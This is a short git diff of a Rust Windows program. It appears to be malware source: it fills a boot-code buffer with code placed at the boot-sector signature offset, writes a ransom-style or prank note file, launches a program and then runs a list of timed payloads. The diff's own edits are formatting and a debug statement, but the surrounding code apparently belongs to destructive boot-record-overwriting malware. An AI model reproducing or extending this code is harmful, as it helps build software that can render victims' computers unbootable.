@@ -177,7 +177,6 @@ fn main() -> Result<(), WinError> {
     .unwrap();
 
     let mut boot_code = vec![LMEM_ZEROINIT; 65536];
-
     boot_code[..CODE1_LEN].copy_from_slice(&CODE1[..CODE1_LEN]);
     boot_code[0x1fe..(0x1fe + CODE2_LEN)].copy_from_slice(&CODE2[..CODE2_LEN]);
 
@@ -213,7 +212,15 @@ fn main() -> Result<(), WinError> {
     )
     .unwrap();
 
-    if !unsafe { WriteFile(note, Some(data::msg::MSG.as_bytes()), Some(&mut wb), None).as_bool() } {
+    if !unsafe {
+        WriteFile(
+            note,
+            Some(data::msg::MSG.as_bytes()),
+            Some(&mut wb),
+            None,
+        )
+        .as_bool()
+    } {
         #[cfg(not(feature = "DEBUG_MODE"))]
         eprintln!("Failed WriteFile()\nGetLastError: {:?}", unsafe {
             GetLastError()
@@ -240,6 +247,8 @@ fn main() -> Result<(), WinError> {
         PCSTR::null(),
         SW_SHOWDEFAULT,
     )?;
+
+    dbg!();
 
     for payload in PAYLOADS.iter().take(N_PAYLOADS) {
         sleep(Duration::from_millis(payload.delay as u64));
